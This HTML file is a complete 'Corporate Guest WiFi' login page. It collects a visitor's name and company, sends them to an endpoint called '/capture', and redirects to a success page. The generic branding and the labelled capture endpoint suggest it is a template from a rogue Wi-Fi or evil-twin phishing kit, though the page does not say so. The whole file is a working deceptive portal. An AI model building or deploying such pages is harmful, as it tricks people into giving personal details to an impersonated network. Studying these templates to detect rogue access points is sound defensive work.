<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Corporate WiFi</title><style>*{margin:0;padding:0}body{font-family:Arial;background:linear-gradient(135deg,#2C3E50,#34495E);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}.container{background:white;border-radius:10px;max-width:400px;width:100%;padding:40px 30px}.logo h1{color:#2C3E50;font-size:24px;text-align:center;margin-bottom:30px}.form-group{margin-bottom:20px}label{display:block;margin-bottom:8px;color:#555;font-weight:500}input{width:100%;padding:12px;border:2px solid #ddd;border-radius:5px}input:focus{outline:none;border-color:#2C3E50}button{width:100%;padding:14px;background:#2C3E50;color:white;border:none;border-radius:5px;font-weight:bold;cursor:pointer}</style></head><body><div class="container"><div class="logo"><h1>CORPORATE GUEST WiFi</h1></div><form id="loginForm"><div class="form-group"><label>Name</label><input type="text" id="name" required placeholder="John Doe"></div><div class="form-group"><label>Company</label><input type="text" id="company" required placeholder="Company Name"></div><button type="submit">Connect</button></form></div><script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();const name=document.getElementById('name').value;const company=document.getElementById('company').value;console.log('[Corporate] Name:',name,'Company:',company);fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({portal:'Corporate',name:name,company:company})}).catch(err=>console.log(err));window.location.href='success.html';});</script></body></html>
